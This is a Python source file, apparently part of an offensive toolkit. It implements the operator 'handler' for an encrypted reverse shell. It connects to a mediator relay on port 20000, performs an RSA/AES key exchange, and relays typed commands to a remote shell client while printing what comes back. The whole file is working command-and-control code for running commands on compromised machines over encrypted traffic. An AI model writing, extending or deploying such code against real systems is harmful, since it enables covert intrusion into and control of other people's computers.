#!/usr/bin/python3
"""
Program: handler.py
Author: C.J. May
Description: Basic TCP stream interaction with a reverse shell -- to be used with mediator.py server to be bridged to the reverse shell client connection
"""

from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from socket import *
import sys
import threading


class Handler:
    def __init__(self, mediatorHost="", connectionKey="CHANGE ME!!!"):
        self.connectionKey = connectionKey
        self.shell = socket()
        self.shell.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.stopReceiving = False
        self.lastCommand = ""
        if not mediatorHost:
            raise(ValueError("Hostname of mediator server not specified."))
        self.connect(mediatorHost)
        self.privKey, self.pubKey = self.getRSA()
        self.cipherKey = self.keyExchange()

    def sendCommands(self):
        command = ""
        while True:
            ch = sys.stdin.read(1)
            command += ch
            if command[-1] == "\n":
                cipher = AES.new(self.cipherKey, AES.MODE_EAX)
                nonce = cipher.nonce
                ciphertext, tag = cipher.encrypt_and_digest(command.encode())
                self.shell.send(nonce)
                self.shell.send(tag)
                self.shell.send(ciphertext)
                self.lastCommand = command
                if command == "exit\n":
                    break
                command = ""

    def readResponses(self):
        while True:
            # end thread if done sending commands
            if self.stopReceiving:
                break
            # decrypt message
            nonce = self.shell.recv(16)
            tag = self.shell.recv(16)
            ciphertext = self.shell.recv(1)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
            response = cipher.decrypt(ciphertext)
            # print reponse if there is one
            if len(response) > 0:
                # don't echo command that was just entered
                if len(self.lastCommand) > 0:
                    if len(self.lastCommand) > 1:
                        self.lastCommand = self.lastCommand[1:]
                    else:
                        self.lastCommand = ""
                    continue
                print(response.decode(), end="", flush=True)

    def getRSA(self):
        try:
            keyFile = open("handler.pem", "rb")
            key = keyFile.read()
            if not key:
                raise FileNotFoundError
            priv = RSA.importKey(key)
            pub = priv.publickey()
        except FileNotFoundError:
            priv, pub = self.genRSA()
        return (priv, pub)

    def genRSA(self):
        print("Generating new RSA 4096 key pair...")
        key = RSA.generate(4096)
        with open("handler.pem", "wb") as f:
            f.write(key.export_key('PEM'))
        return (key, key.publickey())

    def keyExchange(self):
        print("Performing key exchange...")
        self.shell.send(self.pubKey.exportKey('PEM'))
        message = self.shell.recv(1024)
        cipher = PKCS1_OAEP.new(self.privKey)
        aesKey = cipher.decrypt(message)
        return aesKey

    def connect(self, mediatorHost):
        # connect to moderator on operator port
        self.shell.connect((gethostbyname(mediatorHost), 20000))
        # send verification
        self.shell.sendall(self.connectionKey.encode())

    def run(self):
        # start I/O threads to control the reverse shell
        operatorToShell = threading.Thread(target=self.sendCommands, args=[])
        operatorToShell.daemon = True
        operatorToShell.start()
        shellToOperator = threading.Thread(target=self.readResponses, args=[])
        shellToOperator.daemon = True
        shellToOperator.start()
        # wait for threads to join
        operatorToShell.join()
        self.stopReceiving = True
        shellToOperator.join()
        print("Closing connection...")
        self.shell.close()


if __name__ == "__main__":
    handler = Handler(mediatorHost="example.com")
    handler.run()

